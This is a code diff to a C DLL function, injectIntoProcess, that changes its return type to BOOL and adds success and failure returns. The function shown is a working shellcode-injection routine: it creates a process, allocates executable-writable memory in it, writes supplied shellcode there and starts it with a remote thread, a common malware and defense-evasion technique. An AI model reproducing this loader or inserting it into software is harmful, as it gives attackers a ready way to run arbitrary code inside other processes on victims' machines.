@@ -13,12 +13,15 @@
  *
  *      [in] LPCSTR lpApplicationName: name of the application to create a process of
  *
+ * Output:
+ *      BOOL: If function fails FALSE, otherwise TRUE
+ *
  * Note:
  *      The function uses a standard CreateProcessA, VirtualAllocEx,
  *      WriteProcessMemory, and CreateRemoteThread execution flow. 
  *      The memory is allocated with PAGE_EXECUTE_READWRITE protections and it doesn't revert the protection rights
  */
-DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
+DLLEXPORT BOOL WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize, LPCSTR lpApplicationName)
 {
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
@@ -30,7 +33,7 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         #ifdef DEBUG
         printf("CreateProcess failed (%d).\n", GetLastError());
         #endif
-        return;
+        return FALSE;
     }
 
     LPVOID remoteMemory = VirtualAllocEx(pi.hProcess, NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -39,7 +42,7 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         printf("VirtualAllocEx failed (%d).\n", GetLastError());
         #endif
         TerminateProcess(pi.hProcess, 1);
-        return;
+        return FALSE;
     }
 
     SIZE_T bytesWritten;
@@ -49,7 +52,7 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         #endif
         VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
         TerminateProcess(pi.hProcess, 1);
-        return;
+        return FALSE;
     }
 
     HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
@@ -59,7 +62,7 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
         #endif
         VirtualFreeEx(pi.hProcess, remoteMemory, 0, MEM_RELEASE);
         TerminateProcess(pi.hProcess, 1);
-        return;
+        return FALSE;
     }
 
     WaitForSingleObject(hThread, INFINITE);
@@ -69,6 +72,6 @@ DLLEXPORT VOID WINAPI injectIntoProcess(BYTE shellcode[], SIZE_T dwShellcodeSize
     TerminateThread(pi.hThread, 0);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    return;
+    return TRUE;
 }
 
